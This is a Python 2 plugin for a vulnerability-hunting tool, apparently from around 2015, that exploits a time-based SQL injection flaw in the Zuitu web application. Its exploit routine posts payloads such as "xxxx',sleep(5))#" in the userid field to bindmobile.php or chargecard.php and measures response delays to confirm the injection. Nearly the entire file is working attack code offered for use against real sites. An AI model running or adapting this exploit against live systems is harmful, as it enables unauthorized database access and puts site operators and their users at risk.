# -*- coding: cp936 -*-
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
from libs.functions import *
#import modules.*


class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'Zuitu延时注入漏洞_userid',
        'author':'demon',
        'update':'2015/10/06',
        'site':'http://www.dawner.info',
        'vuln_type':'sqlinjection',
        'vuln_source':'http://www.wooyun.org/bugs/wooyun-2014-066035'
        }
    opts  = {
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url

    def exploit(self):
        '''start exploit'''
        socket.setdefaulttimeout(20)
        exp_url = self.url+'/account/bindmobile.php'
        exp_url_bak = self.url + '/ajax/chargecard.php'
        try:
            resp = url_get(exp_url).read()
        except Exception,e:
            print e
            exp_url = exp_url_bak
            resp = url_get(exp_url).read()
        try:
            value_2 = {"userid":"sssssssssssssssssssss',sleep(2))#"}
            time_2 = self.post_url(value_2,exp_url)
            #post_data=urllib.urlencode(value)
            #cj =  cookielib.CookieJar()
            #opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            #headers ={"User-agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"}
            #req=urllib2.Request(exp_url,post_data,headers)
            #t1 = datetime.datetime.now()
            #req_resp = opener.open(req).read()
#print resp
            #t2 = datetime.datetime.now()
            #time_1 = (t2-t1).seconds

            value_5 = {"userid":"xxxx',sleep(5))#"}
            time_5 = self.post_url(value_5,exp_url)

            print "time_2:"+str(time_2)
            print "time_5:"+str(time_5)
            t = time_5 / time_2
            if  t >= 2 :
                print '[!]Zuitu exsit sqli at  parameter userid.\n'
                print '[+]Vul_url:'+exp_url+'\n'
                exp_url =  str(exp_url)
                #return exp_url
            else:
                print 't:'+str(t)
        except Exception,e:
            print e
    def post_url(self,value,exp_url):
       
        post_data=urllib.urlencode(value)

        t1 = datetime.datetime.now()
        req_resp = urllib2.urlopen(exp_url,post_data)
        t2 = datetime.datetime.now()

        time = (t2-t1).seconds
        return time
